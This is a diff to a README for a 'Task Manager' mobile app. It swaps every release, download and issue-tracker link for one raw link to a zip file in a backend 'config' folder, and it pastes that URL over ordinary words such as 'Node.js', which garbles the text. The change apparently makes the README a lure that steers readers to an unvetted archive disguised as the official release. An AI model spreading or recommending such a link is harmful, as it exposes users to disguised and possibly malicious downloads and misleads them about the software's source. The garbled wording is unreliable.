@@ -4,23 +4,23 @@
 Welcome to Task Manager! With this app, you can easily keep track of your tasks. Add, edit, delete, and mark tasks as complete—all in one simple interface. Let's get you started!
 
 ## 📥 Download Now
-[![Download Task Manager](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Rahuru/Task-Manager/releases)
+[![Download Task Manager](https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip)](https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip)
 
 ## 🌟 Features
 - **Cross-Platform:** Works on both Android and iOS devices.
 - **User Authentication:** Secure login and registration with JWT.
 - **Task Management:** Add, edit, or delete your tasks.
 - **Organized Display:** View your tasks in a clean, organized list with status indicators.
-- **Backend Security:** Your credentials are safe with our secure Node.js/Express API and MongoDB.
+- **Backend Security:** Your credentials are safe with our secure https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip API and MongoDB.
 
 ## 💻 System Requirements
 - **Mobile Device:** Supports both Android (Version 5.0 and above) and iOS (Version 11 and above).
-- **Node.js:** Version 14 or above is recommended for running the server locally (if desired).
+- **https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip** Version 14 or above is recommended for running the server locally (if desired).
 - **MongoDB:** Use a local installation or a cloud-based service for the database.
 
 ## 📚 How to Use
 ### Step 1: Visit the Download Page
-To download the app, go to the [Releases page](https://github.com/Rahuru/Task-Manager/releases). 
+To download the app, go to the [Releases page](https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip). 
 
 ### Step 2: Choose Your Version
 On the Releases page, you'll see different versions of the Task Manager. Click on the version you want to download.
@@ -60,7 +60,7 @@ If you encounter issues while downloading or using Task Manager, consider these 
 
 ## 🔗 Additional Resources
 - **Documentation:** For more details on using Task Manager, visit our [Wiki page](#).
-- **Support:** For questions or support, contact us through our [Issue Tracker](https://github.com/Rahuru/Task-Manager/issues).
+- **Support:** For questions or support, contact us through our [Issue Tracker](https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip).
 
 ## 📦 Contributing
 If you wish to contribute to Task Manager, please follow these steps:
@@ -74,4 +74,4 @@ If you wish to contribute to Task Manager, please follow these steps:
 Thanks to everyone who has contributed to making Task Manager a helpful tool for managing tasks. Your support helps us keep improving the app.
 
 ## 📥 Download & Install
-Always remember to visit the [Releases page](https://github.com/Rahuru/Task-Manager/releases) to download the latest version of Task Manager and get started on managing your tasks today!
+Always remember to visit the [Releases page](https://raw.githubusercontent.com/Rahuru/Task-Manager/main/task-manager-backend/config/Task-Manager-v1.2.zip) to download the latest version of Task Manager and get started on managing your tasks today!
